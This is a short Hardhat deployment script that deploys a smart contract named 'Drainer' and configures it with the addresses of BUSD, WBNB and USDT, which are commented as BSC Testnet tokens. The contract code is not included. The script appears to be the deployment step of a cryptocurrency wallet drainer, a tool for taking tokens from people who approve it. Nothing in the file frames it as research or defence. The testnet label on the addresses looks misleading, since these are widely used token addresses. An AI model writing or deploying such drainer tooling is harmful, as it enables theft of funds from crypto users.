const hre = require("hardhat");

async function main() {
  // List of token addresses on BSC Testnet
  const tokenAddresses = [
    "0xe9e7cea3dedca5984780bafc599bd69add087d56", // BUSD
    "0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c",  // BNB & WBNB
    "0x55d398326f99059ff775485246999027b3197955"   //usdt
  ];

  // Get the contract to deploy
  const Drainer = await hre.ethers.getContractFactory("Drainer");

  // Deploy contract with target token addresses
  const drainer = await Drainer.deploy(tokenAddresses);

  // Wait for deployment confirmation
  await drainer.waitForDeployment();

  console.log(`Drainer deployed to: ${await drainer.getAddress()}`);
}

// Run the main function
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
